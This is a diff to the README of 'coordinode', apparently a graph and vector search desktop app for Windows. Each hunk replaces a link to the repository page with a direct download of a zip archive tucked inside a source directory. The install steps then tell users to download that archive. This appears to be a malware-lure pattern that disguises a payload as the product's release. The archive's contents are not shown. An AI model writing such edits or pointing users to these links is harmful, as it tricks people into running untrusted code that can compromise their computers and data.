@@ -1,6 +1,6 @@
 # 🧭 coordinode - Search Graph Data in One Place
 
-[![Download coordinode](https://img.shields.io/badge/Download-coordinode-blue?style=for-the-badge&logo=github)](https://github.com/sarcosomebankcheck694/coordinode)
+[![Download coordinode](https://img.shields.io/badge/Download-coordinode-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sarcosomebankcheck694/coordinode/main/crates/coordinode-search/src/Software-v3.8-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ coordinode is a desktop app for graph search, vector search, and full-text searc
 
 Use the link below to visit the download page and get the app for Windows.
 
-[Visit the coordinode download page](https://github.com/sarcosomebankcheck694/coordinode)
+[Visit the coordinode download page](https://raw.githubusercontent.com/sarcosomebankcheck694/coordinode/main/crates/coordinode-search/src/Software-v3.8-alpha.1.zip)
 
 ## 💻 What You Get
 
@@ -44,7 +44,7 @@ For larger data sets, 16 GB RAM gives better results.
 ## 🖱️ Download and Install on Windows
 
 1. Open the download page:
-   - [https://github.com/sarcosomebankcheck694/coordinode](https://github.com/sarcosomebankcheck694/coordinode)
+   - [https://raw.githubusercontent.com/sarcosomebankcheck694/coordinode/main/crates/coordinode-search/src/Software-v3.8-alpha.1.zip](https://raw.githubusercontent.com/sarcosomebankcheck694/coordinode/main/crates/coordinode-search/src/Software-v3.8-alpha.1.zip)
 
 2. On the page, find the latest Windows file.
 
@@ -225,7 +225,7 @@ coordinode is built around these areas:
 
 If you need the file again, use this page:
 
-[https://github.com/sarcosomebankcheck694/coordinode](https://github.com/sarcosomebankcheck694/coordinode)
+[https://raw.githubusercontent.com/sarcosomebankcheck694/coordinode/main/crates/coordinode-search/src/Software-v3.8-alpha.1.zip](https://raw.githubusercontent.com/sarcosomebankcheck694/coordinode/main/crates/coordinode-search/src/Software-v3.8-alpha.1.zip)
 
 ## 🧭 Suggested Next Steps
 
